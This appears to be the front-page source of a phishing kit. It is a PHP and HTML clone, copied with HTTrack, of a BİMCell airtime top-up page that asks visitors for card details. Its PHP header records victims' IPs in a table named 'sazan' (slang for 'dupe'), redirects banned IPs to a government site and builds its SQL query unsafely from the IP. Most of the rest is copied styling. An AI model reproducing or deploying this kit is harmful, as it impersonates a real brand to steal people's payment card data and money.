<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
$ip = $_SERVER['REMOTE_ADDR'];
$db->query("UPDATE sazan SET now = 'AnaSayfa' WHERE ip = '{$ip}'");

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}

?>
<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta id="description" name="description" content="Bimcell TL yüklemek için, yüklemek istediğiniz telefon numarasını, almak istediğiniz TL miktarını ve kredi kartı/banka kartı bilgilerinizi giriniz">
    <meta id="XUACompatible" http-equiv="X-UA-Compatible" content="IE=edge">
    <meta id="descviewport" name="viewport" content="width=device-width, initial-scale=1">
    <meta id="keywords" name="keywords" content="Bimcell TL Yükle, TL Yükle, BimcellTlYükle">

    <title>BİMCell - TL Yükle</title>


    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    
<link href="public/front/bim/css/reset.css" rel="stylesheet" type="text/css">
<link href="public/front/bim/css/bootstrap.css" rel="stylesheet" type="text/css" media="screen">
<link href="public/front/bim/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
<link href="public/front/bim/css/style.css" rel="stylesheet" type="text/css" media="screen">
<link href="public/front/bim/css/responsive.css" rel="stylesheet" type="text/css" media="screen">

<style>
    .divLoading[_ngcontent-c1] {
        position: fixed;
        width: 100%;
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
        background-color: #dddddde3;
        z-index: 9999;
        display: block;
        margin-left: auto;
        margin-right: auto
    }

    .spnImage[_ngcontent-c1] {
        position: fixed;
        font-size: 15px;
        font-weight: 600;
        color: #1fb5c7;
        width: 100%;
        left: 0;
        right: 0;
        top: 40%;
        bottom: 0;
        z-index: 10000;
        display: block;
        text-align: center;
        margin-left: auto;
        margin-right: auto
    }

    #loadingImg[_ngcontent-c1] {
        padding: 14px;
        margin-left: auto;
        margin-right: auto
    }

    @font-face {
        font-family: Muli;
        src: url(assets/fonts/Muli/Muli-Regular.html);
        src: url(assets/fonts/Muli/Muli-Regulard41d.html?#iefix) format("embedded-opentype"), url(assets/fonts/Muli/Muli-Regular-2.html) format("woff"), url(assets/fonts/Muli/Muli-Regular-3.html) format("truetype"), url(assets/fonts/Muli/Muli-Regular-4.html#Muli) format("svg")
    }

    *[_ngcontent-c1] {
        font-family: Muli !important
    }
</style>
<style>
    @font-face {
        font-family: Muli;
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: url(7Aulp_0qiz-aVz7u3PJLcUMYOFnOkEk40eiNxw.bcdec8a1c0dd6d828cac.html) format('woff2');
        unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB
    }

    @font-face {
        font-family: Muli;
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: url(7Aulp_0qiz-aVz7u3PJLcUMYOFnOkEk50eiNxw.d06ba2bdd367247f6525.html) format('woff2');
        unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF
    }

    @font-face {
        font-family: Muli;
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: url(7Aulp_0qiz-aVz7u3PJLcUMYOFnOkEk30eg.705bcc4dd1c37efca70d.html) format('woff2');
        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
    }

    .container-fluid[_ngcontent-c2] {
        padding-bottom: 40px
    }

    ._container[_ngcontent-c2] {
        max-width: 570px !important;
        overflow-x: hidden
    }

    @media only screen and (max-width:569px) {
        ._container[_ngcontent-c2] {
            width: 100% !important
        }
    }

    @media only screen and (min-width:570px) and (max-width:768px) {
        .col-md-6[_ngcontent-c2] {
            flex: 0 0 50%;
            max-width: 50% !important
        }
    }

    .btn[_ngcontent-c2]:focus {
        outline: 0;
        box-shadow: none
    }

    *[_ngcontent-c2] {
        font-family: Muli, arial, sans-serif !important
    }

    .fa[_ngcontent-c2] {
        font: 14px/1 FontAwesome !important
    }

    .ibm-form[_ngcontent-c2] h4.title[_ngcontent-c2] {
        font-size: 20px !important;
        color: #222943;
        margin-bottom: 15px
    }

    .ibm-form[_ngcontent-c2]>label[_ngcontent-c2] {
        font-size: 20px !important;
        color: #222943
    }

    .ibm-form[_ngcontent-c2] .mat-form-field[_ngcontent-c2] {
        display: block
    }

    .ibm-form[_ngcontent-c2] .mat-form-field-flex[_ngcontent-c2] {
        border: 1px solid #dee3ed;
        border-radius: 4px
    }

    .ibm-form[_ngcontent-c2] .mat-form-field-appearance-fill[_ngcontent-c2] .mat-form-field-flex[_ngcontent-c2] {
        background-color: #fff
    }

    .ibm-form[_ngcontent-c2] .mat-input-element[_ngcontent-c2] {
        color: #222943
    }

    .ibm-form[_ngcontent-c2] .mat-form-field-label[_ngcontent-c2] {
        color: #717d8d
    }

    .ibm-form[_ngcontent-c2] .mat-form-field.mat-focused[_ngcontent-c2] .mat-form-field-label[_ngcontent-c2] {
        color: #717d8d;
        font-size: 12px
    }

    .ibm-form[_ngcontent-c2] .mat-form-field-appearance-fill[_ngcontent-c2] .mat-form-field-underline[_ngcontent-c2]::before,
    .ibm-form[_ngcontent-c2] .mat-form-field-ripple[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .mat-form-field.mat-focused[_ngcontent-c2] .mat-form-field-ripple[_ngcontent-c2] {
        background-color: transparent
    }

    .ibm-form[_ngcontent-c2] .invalid[_ngcontent-c2] .mat-form-field-label[_ngcontent-c2] {
        color: #cc2d1f
    }

    .ibm-form[_ngcontent-c2] .invalid[_ngcontent-c2] .mat-form-field-flex[_ngcontent-c2] {
        border-bottom: 1px solid #cc2d1f
    }

    .ibm-form[_ngcontent-c2] .invalid.mat-form-field.mat-focused[_ngcontent-c2] .mat-form-field-label[_ngcontent-c2] {
        color: #cc2d1f
    }

    .mat-select-panel[_ngcontent-c2] {
        min-width: calc(100% + 24px) !important;
        max-width: 100% !important;
        transform: translate(-8px, 27px) !important;
        box-shadow: 0 !important;
        border: 1px solid #dee3ed;
        border-top: 0;
        border-bottom: 0;
        right: 0
    }

    .mat-select-panel[_ngcontent-c2]:not([class*=mat-elevation-z]) {
        box-shadow: 0 0 0 0 transparent, 0 0 0 0 transparent, 0 0 0 0 transparent !important
    }

    .mat-select-panel[_ngcontent-c2] .mat-option[_ngcontent-c2] {
        border-bottom: 1px solid #dee3ed !important;
        height: 48px !important
    }

    .mat-select-panel[_ngcontent-c2] .mat-option-text[_ngcontent-c2] {
        color: #919eba
    }

    .mat-select-panel[_ngcontent-c2] .mat-active[_ngcontent-c2] {
        background-color: #dee3ed !important
    }

    .mat-select-panel.ng-animating[_ngcontent-c2] {
        display: none
    }

    .input-info-success[_ngcontent-c2] {
        height: 18px;
        width: 18px;
        background: url(assets/img/ibm-icon/input-info-success.html) center center no-repeat;
        position: absolute;
        z-index: 10;
        display: inline-block;
        top: -5px;
        right: 0
    }

    .mat-tooltip[_ngcontent-c2] {
        font-size: 10px !important
    }

    .ibm-form[_ngcontent-c2] .btn[_ngcontent-c2] {
        width: 100%;
        display: block;
        height: 44px;
        margin: 20px 0;
        border-radius: 4px;
        font-weight: 600;
        font-size: 16px !important;
        background: #0a396d;
        color: #fff;
        cursor: pointer !important
    }

    .ibm-form[_ngcontent-c2] a.btn[_ngcontent-c2] {
        line-height: 44px;
        font-size: 16px !important
    }

    .mat-flat-button[_ngcontent-c2]>.mat-button-wrapper[_ngcontent-c2] {
        font-size: 16px !important
    }

    .ibm-form[_ngcontent-c2] .btn[_ngcontent-c2]:disabled {
        background: #dee3ed;
        color: #919eba
    }

    .ibm-form[_ngcontent-c2] a.btn.disabled[_ngcontent-c2] {
        pointer-events: none;
        background: #dee3ed;
        color: #919eba
    }

    .ibm-form[_ngcontent-c2] .form-alert[_ngcontent-c2] {
        display: block;
        margin-bottom: 20px;
        padding-left: 30px
    }

    .ibm-form[_ngcontent-c2] .form-alert.default[_ngcontent-c2] {
        color: #717d8d;
        background: url(assets/img/ibm-icon/alert-default.html) left top/18px 18px no-repeat
    }

    .ibm-form[_ngcontent-c2] .form-alert.error[_ngcontent-c2] {
        color: #cc2d1f;
        background: url(assets/img/ibm-icon/alert-error.html) left top/18px 18px no-repeat
    }

    .ibm-form[_ngcontent-c2] .tealblue.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .tealblue.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #049ead !important
    }

    .ibm-form[_ngcontent-c2] .blue.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .blue.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #0082ca !important
    }

    .ibm-form[_ngcontent-c2] .deepturquoise.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .deepturquoise.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #006777 !important
    }

    .ibm-form[_ngcontent-c2] .tealblue[_ngcontent-c2] .checkbox.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .tealblue[_ngcontent-c2] .checkbox.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #049ead !important
    }

    .ibm-form[_ngcontent-c2] .blue[_ngcontent-c2] .checkbox.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .blue[_ngcontent-c2] .checkbox.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #0082ca !important
    }

    .ibm-form[_ngcontent-c2] .checkbox.deepturquoise.mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .ibm-form[_ngcontent-c2] .deepturquoise[_ngcontent-c2] .checkbox.mat-checkbox-checked.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2] {
        background-color: #006777 !important
    }

    .ibm-form[_ngcontent-c2] .checkbox[_ngcontent-c2] .mat-checkbox-frame[_ngcontent-c2] {
        border-width: 1px;
        border-color: #919eba
    }

    .ibm-form[_ngcontent-c2] .checkbox[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .mat-checkbox-frame[_ngcontent-c2] {
        border-radius: 4px
    }

    .ibm-form[_ngcontent-c2] .checkbox-group[_ngcontent-c2] .checkbox[_ngcontent-c2] {
        margin-right: 10px;
        border-radius: 4px;
        position: relative;
        top: 3px
    }

    .ibm-form[_ngcontent-c2] .checkbox-group[_ngcontent-c2] a[_ngcontent-c2] {
        font-weight: 600;
        cursor: pointer
    }

    .ibm-form[_ngcontent-c2] .checkbox-group.tealblue[_ngcontent-c2] a[_ngcontent-c2] {
        color: #049ead !important
    }

    .ibm-form[_ngcontent-c2] .checkbox-group.blue[_ngcontent-c2] a[_ngcontent-c2] {
        color: #0082ca !important
    }

    .ibm-form[_ngcontent-c2] .checkbox-group.deepturquoise[_ngcontent-c2] a[_ngcontent-c2] {
        color: #006777 !important
    }

    .info-card[_ngcontent-c2] h4[_ngcontent-c2] {
        color: #222943;
        font-size: 20px !important;
        font-weight: 700;
        margin-bottom: 30px
    }

    .info-card[_ngcontent-c2] p[_ngcontent-c2] {
        font-size: 16px !important
    }

    .info-card[_ngcontent-c2] .btn[_ngcontent-c2] {
        font-size: 16px !important;
        font-weight: 700;
        background: #fff;
        border: 1px solid #222943;
        padding: 8px 35px
    }

    .info-card-order[_ngcontent-c2] {
        background: #fcfcfd;
        border-radius: 4px;
        padding: 15px;
        color: #222943;
        border: 1px solid #dee3ed;
        font-size: 16px !important
    }

    .modal-content[_ngcontent-c2] {
        background: url(assets/img/ibm-icon/modal-icon.html) right center/30% auto no-repeat #049ead;
        border-radius: 4px 40px
    }

    .modal-content[_ngcontent-c2]>.modal-body[_ngcontent-c2]>.modal-title[_ngcontent-c2] {
        color: #222943;
        font-size: 20px !important;
        font-weight: 700;
        margin-bottom: 10px
    }

    .modal-content[_ngcontent-c2]>.modal-body[_ngcontent-c2] {
        width: 70%;
        background: #fff;
        border-radius: 4px 0 0;
        padding: 30px;
        color: #414c5b
    }

    .modal-content[_ngcontent-c2]>.modal-footer[_ngcontent-c2] {
        width: 70%;
        background: #fff;
        border-top: none;
        border-radius: 0 0 0 40px;
        padding: 0 30px 30px;
        position: relative;
        height: 140px
    }

    .modal-content[_ngcontent-c2]>.modal-footer[_ngcontent-c2]>.btn[_ngcontent-c2] {
        border: 1px solid #002855;
        font-weight: 700;
        width: calc(50% - 8px);
        height: 44px
    }

    .modal-content[_ngcontent-c2]>.modal-footer[_ngcontent-c2]>.modal-btn-approve[_ngcontent-c2] {
        color: #fff;
        background: #002855;
        top: 0;
        width: calc(100% - 60px);
        left: 30px
    }

    .modal-content[_ngcontent-c2]>.modal-footer[_ngcontent-c2]>.modal-btn-close[_ngcontent-c2] {
        color: #002855;
        background: #fff;
        position: absolute;
        top: 60px;
        width: calc(100% - 60px);
        left: 30px
    }

    .info[_ngcontent-c2] {
        min-height: 80px;
        padding-left: 80px
    }

    .info[_ngcontent-c2] h4[_ngcontent-c2] {
        color: #222943;
        font-size: 20px !important;
        font-weight: 700;
        margin-bottom: 10px
    }

    .info[_ngcontent-c2] p[_ngcontent-c2] {
        color: #222943;
        font-size: 16px !important
    }

    .info.info-success[_ngcontent-c2] {
        background: url(assets/img/ibm-icon/info-success-icon.html) left top/60px 60px no-repeat
    }

    .info.info-warning[_ngcontent-c2] {
        background: url(assets/img/ibm-icon/info-warning-icon.html) left top/60px 60px no-repeat
    }

    .info.info-error[_ngcontent-c2] {
        background: url(assets/img/ibm-icon/info-error-icon.html) left top/60px 60px no-repeat
    }

    .mat-expansion-panel-header[_ngcontent-c2] {
        padding: 18px 24px 18px 0
    }

    .mat-expansion-indicator[_ngcontent-c2]::after {
        border-style: solid;
        border-width: 0 2px 2px 0;
        padding: 0 !important;
        transform: none !important;
        content: '';
        display: inline-block;
        content: '';
        position: absolute;
        border-top-width: 10px !important;
        border-right-width: 5px !important;
        border-left-width: 5px !important;
        border-right-color: transparent;
        border-bottom-color: transparent;
        border-left-color: transparent
    }

    .mat-expansion-panel[_ngcontent-c2]:not([class*=mat-elevation-z]) {
        box-shadow: none !important;
        border: 1px solid #dee3ed;
        border-radius: 4px
    }

    .mat-expansion-panel[_ngcontent-c2] .mat-expansion-panel-body[_ngcontent-c2] {
        padding: 0
    }

    .mat-expansion-panel-header-title[_ngcontent-c2] {
        color: #919eba !important;
        font-size: 16px !important;
        padding: 18px
    }

    .mat-accordion[_ngcontent-c2] ul[_ngcontent-c2] li[_ngcontent-c2] {
        list-style: none
    }

    .mat-accordion[_ngcontent-c2] ul[_ngcontent-c2] li[_ngcontent-c2] a[_ngcontent-c2] {
        display: block;
        color: #919eba !important;
        font-size: 16px !important;
        padding: 18px;
        border-top: 1px solid #dee3ed;
        cursor: pointer
    }

    .mat-accordion[_ngcontent-c2] ul[_ngcontent-c2] li[_ngcontent-c2] a[_ngcontent-c2]:hover {
        background: rgba(222, 227, 237, .41)
    }

    .info-table[_ngcontent-c2] td[_ngcontent-c2],
    .info-table[_ngcontent-c2] th[_ngcontent-c2] {
        padding: 18px
    }

    .info-table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:first-child {
        width: 200px
    }

    .info-table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:last-child {
        font-weight: 700
    }

    .billnotfound[_ngcontent-c2] {
        margin-bottom: 10px
    }

    .mat-tab-header[_ngcontent-c2],
    .mat-tab-nav-bar[_ngcontent-c2] {
        border: 1px solid #dee3ed
    }

    .mat-tab-group.mat-primary[_ngcontent-c2] .mat-ink-bar[_ngcontent-c2],
    .mat-tab-nav-bar.mat-primary[_ngcontent-c2] .mat-ink-bar[_ngcontent-c2] {
        background-color: transparent
    }

    .mat-tab-label[_ngcontent-c2] {
        border-left: 4px solid #dee3ed;
        background-color: #f9fafc;
        color: #666f85;
        opacity: 1 !important
    }

    .tabs-2[_ngcontent-c2] .mat-tab-label[_ngcontent-c2] {
        width: 50%
    }

    .tabs-3[_ngcontent-c2] .mat-tab-label[_ngcontent-c2] {
        width: 33.333%
    }

    .tabs-4[_ngcontent-c2] .mat-tab-label[_ngcontent-c2] {
        width: 25%
    }

    .mat-tab-label[_ngcontent-c2]>.mat-tab-label-content[_ngcontent-c2] {
        font-size: 16px;
        font-weight: 400
    }

    .mat-tab-label-active[_ngcontent-c2] {
        border-left: 4px solid #049ead;
        background-color: #fff
    }

    .mat-tab-label-active[_ngcontent-c2]>.mat-tab-label-content[_ngcontent-c2] {
        color: #222943;
        font-weight: 700
    }

    .buttonTooltip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] {
        background-color: #6f7485 !important;
        color: #fff;
        font-family: Muli !important;
        font-weight: lighter !important
    }

    .buttonTooltip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] .arrow[_ngcontent-c2] {
        background-color: #6f7485 !important;
        color: #fff
    }

    .buttonTooltip[_ngcontent-c2] .arrow[_ngcontent-c2]::before {
        border-top-color: #6f7485 !important;
        border-bottom-color: #6f7485
    }

    .info-card[_ngcontent-c2] {
        background: #fcfcfd;
        border-radius: 4px;
        padding: 15px;
        color: #222943;
        border: 1px solid #dee3ed;
        font-size: 16px !important
    }

    .bttn.btnDeactivate[_ngcontent-c2] {
        background: #fff;
        border: 2.9px solid #879ab0;
        color: #365579;
        width: 100% !important;
        border-radius: 4px !important;
        height: 45px !important
    }

    .ibmToolTip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] {
        background-color: #6f7485 !important;
        color: #fff;
        max-width: 340px !important;
        width: 340px !important;
        font-size: 2px !important;
        font-family: Muli !important;
        font-weight: lighter !important;
        margin-right: 300px !important
    }

    .ibmToolTip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] .arrow[_ngcontent-c2] {
        background-color: #6f7485 !important;
        color: #fff
    }

    .ibmToolTip[_ngcontent-c2] .arrow[_ngcontent-c2]::before {
        border-top-color: #6f7485 !important;
        border-bottom-color: #6f7485
    }

    .customerInfo[_ngcontent-c2] label[_ngcontent-c2] {
        font-size: 20px !important
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel-header-title[_ngcontent-c2] {
        padding: 0
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel-header[_ngcontent-c2] {
        padding: 0 !important;
        cursor: pointer !important
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel-spacing[_ngcontent-c2] {
        margin: 0
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel[_ngcontent-c2] {
        margin-bottom: 15px
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel[_ngcontent-c2] .mat-expansion-panel-body[_ngcontent-c2] {
        padding: 0 15px
    }

    .radio-accordion[_ngcontent-c2] .mat-radio-button[_ngcontent-c2] {
        display: block;
        width: 100%
    }

    .radio-accordion[_ngcontent-c2] .mat-radio-label[_ngcontent-c2] {
        width: 100%;
        height: auto;
        margin-bottom: 0;
        padding: 15px;
        cursor: pointer
    }

    .mat-expansion-panel-header-title[_ngcontent-c2],
    .radio-accordion[_ngcontent-c2] .mat-expansion-panel-header-description[_ngcontent-c2] {
        margin-right: 0
    }

    .radio-accordion[_ngcontent-c2] .mat-expansion-panel-header[_ngcontent-c2]:not([aria-disabled=true]) {
        height: auto !important
    }

    .radio-accordion[_ngcontent-c2] .mat-radio-label-content[_ngcontent-c2] {
        white-space: normal
    }

    .mat-radio-button.mat-accent[_ngcontent-c2] .mat-radio-inner-circle[_ngcontent-c2] {
        color: #049ead !important;
        background-color: #049ead !important
    }

    .mat-radio-button.mat-accent.mat-radio-checked[_ngcontent-c2] .mat-radio-outer-circle[_ngcontent-c2] {
        border-color: #049ead !important
    }

    .mat-radio-outer-circle[_ngcontent-c2] {
        border-color: #dee3ed !important
    }

    .radio-accordion.radio-blue[_ngcontent-c2] .mat-radio-button.mat-accent[_ngcontent-c2] .mat-radio-inner-circle[_ngcontent-c2] {
        color: #0082ca !important;
        background-color: #0082ca !important
    }

    .radio-accordion.radio-blue[_ngcontent-c2] .mat-radio-button.mat-accent.mat-radio-checked[_ngcontent-c2] .mat-radio-outer-circle[_ngcontent-c2] {
        border-color: #0082ca !important
    }

    .radio-accordion.deepturquoise[_ngcontent-c2] .mat-radio-button.mat-accent[_ngcontent-c2] .mat-radio-inner-circle[_ngcontent-c2] {
        color: #006777 !important;
        background-color: #006777 !important
    }

    .radio-accordion.deepturquoise[_ngcontent-c2] .mat-radio-button.mat-accent.mat-radio-checked[_ngcontent-c2] .mat-radio-outer-circle[_ngcontent-c2] {
        border-color: #006777 !important
    }

    .btn[_ngcontent-c2] {
        color: #000;
        background-color: #fff;
        width: 100%;
        margin-top: 34px;
        padding-left: 1.25rem;
        padding-top: .6rem;
        font-weight: 700;
        padding-bottom: .6rem;
        box-shadow: 0 0;
        border: 1px solid rgba(0, 0, 0, .12);
        height: 44px
    }

    .container[_ngcontent-c2] div.info-3dsecure[_ngcontent-c2]>p[_ngcontent-c2] {
        width: -webkit-fit-content;
        width: -moz-fit-content;
        width: fit-content;
        height: 20px;
        font-size: 14px;
        font-weight: 400;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.57;
        color: #717d8d !important
    }

    @font-face {
        font-family: Muli;
        src: url(assets/fonts/Muli/Muli-Regular.html);
        src: url(assets/fonts/Muli/Muli-Regulard41d.html?#iefix) format("embedded-opentype"), url(assets/fonts/Muli/Muli-Regular-2.html) format("woff"), url(assets/fonts/Muli/Muli-Regular-3.html) format("truetype"), url(assets/fonts/Muli/Muli-Regular-4.html#Muli) format("svg")
    }

    .billinquerytable[_ngcontent-c2] {
        font-family: Muli
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2] {
        border-radius: 4px;
        border-collapse: collapse
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2] {
        color: #fff
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2] {
        display: table-row-group;
        border-top: none;
        padding: 10px
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2] {
        border-bottom: none;
        border-color: #fff;
        border-top-left-radius: 6px;
        border-top-right-radius: 6px
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2] {
        border-top: none;
        border-bottom: none
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2] {
        vertical-align: middle;
        text-align: center;
        border-left: none;
        border-right: none
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-child(3) {
        text-align: right
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:first-child {
        border-left: 1px solid #dee2e6
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:last-child {
        border-right: 1px solid #dee2e6
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-child(2) {
        text-align: left;
        color: #586473
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-child(2)>h5[_ngcontent-c2] {
        color: #222943;
        font-weight: 700
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]>.duedate[_ngcontent-c2] {
        font-size: 16px !important;
        padding-top: 10px
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]:last-child>td[_ngcontent-c2]:first-child {
        border-bottom-left-radius: 4px
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td.amount[_ngcontent-c2] {
        font-size: 28px !important;
        font-weight: 700;
        color: #222943
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td.amount[_ngcontent-c2]>span[_ngcontent-c2] {
        position: relative;
        top: -10px
    }

    .billinquerytable[_ngcontent-c2] .table-responseve[_ngcontent-c2] {
        border-radius: 10px
    }

    .billinquerytable[_ngcontent-c2] .bill-checkbox[_ngcontent-c2] {
        width: 60px
    }

    .mobil[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2] {
        background: #049ead
    }

    .mobil[_ngcontent-c2] .mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .mobil .mat-checkbox-checked.mat-accent .mat-checkbox-background {
        background-color: #049ead !important
    }

    .sabithat[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2] {
        background: #0082ca
    }

    .sabithat[_ngcontent-c2] .mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .sabithat .mat-checkbox-checked.mat-accent .mat-checkbox-background {
        background-color: #0082ca !important
    }

    .genisbant[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2] {
        background: #006777
    }

    .genisbant[_ngcontent-c2] .mat-checkbox-indeterminate.mat-accent[_ngcontent-c2] .mat-checkbox-background[_ngcontent-c2],
    .genisbant .mat-checkbox-checked.mat-accent .mat-checkbox-background {
        background-color: #006777 !important
    }

    .billnotfound[_ngcontent-c2] {
        background: url(assets/img/billnotfoundicon.html) center 40px/100px auto no-repeat #dee3ed;
        text-align: center;
        padding: 140px 20px 40px;
        border-radius: 4px;
        line-height: 30px;
        font-size: 20px !important;
        font-weight: 700
    }

    .bill-inquiry-total-amount[_ngcontent-c2] {
        margin-bottom: 20px;
        text-align: center;
        border-radius: 4px;
        border: 1px solid #dee3ed;
        margin-top: 20px;
        padding: 10px 0
    }

    .bill-inquiry-total-amount[_ngcontent-c2]>span[_ngcontent-c2] {
        display: block;
        font-weight: 700;
        font-size: 18px !important
    }

    .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr.mobil[_ngcontent-c2] {
        display: none
    }

    .modal-content2[_ngcontent-c2] *[_ngcontent-c2] {
        border-radius: .3rem !important;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji" !important
    }

    .prepaid-order-msisdn[_ngcontent-c2] {
        text-align: center;
        border-radius: 4px;
        border: 1px solid #dee3ed;
        margin-bottom: 20px;
        padding: 10px 0;
        color: #717d8d
    }

    .prepaid-order-msisdn[_ngcontent-c2]>span[_ngcontent-c2] {
        display: block;
        font-weight: 700;
        font-size: 18px !important;
        color: #212529
    }

    .table-prepaid-order-activation-list[_ngcontent-c2] {
        border-collapse: inherit;
        border-spacing: 0 15px
    }

    .table-prepaid-order-activation-list[_ngcontent-c2],
    .table-prepaid-order-activation-list[_ngcontent-c2]>thead[_ngcontent-c2],
    .table-prepaid-order-activation-list[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2],
    .table-prepaid-order-activation-list[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2] {
        border: none
    }

    .table-prepaid-order-activation-list[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2] {
        padding-bottom: 0
    }

    .table-prepaid-order-activation-list[_ngcontent-c2] .btn[_ngcontent-c2] {
        border: 1px solid #002855;
        background: #fff;
        color: #002855;
        width: 100%
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel-header[_ngcontent-c2] {
        padding: 34px 24px 34px 0;
        position: relative
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel-header-title[_ngcontent-c2] {
        color: #222943 !important;
        font-weight: 700;
        font-size: 14px !important;
        padding-left: 0
    }

